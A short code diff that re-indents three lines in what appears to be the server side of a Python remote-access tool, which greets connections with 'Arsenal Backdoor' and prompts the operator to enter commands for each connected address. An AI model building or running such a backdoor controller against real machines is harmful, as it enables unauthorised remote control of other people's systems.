@@ -13,9 +13,9 @@ def client(conn, addr, buff):
     holder = []
     conn.send(b'Arsenal Backdoor\n')
     while True:
-            data = conn.recv(buff)
-            holder.append(str(data.strip(), 'utf-8'))
-            print(addr[0]+':\n'+''.join(holder))
+        data = conn.recv(buff)
+        holder.append(str(data.strip(), 'utf-8'))
+        print(addr[0]+':\n'+''.join(holder))
         while True:
             try:
                 reply=input('Enter command for %s: ' %addr[0])
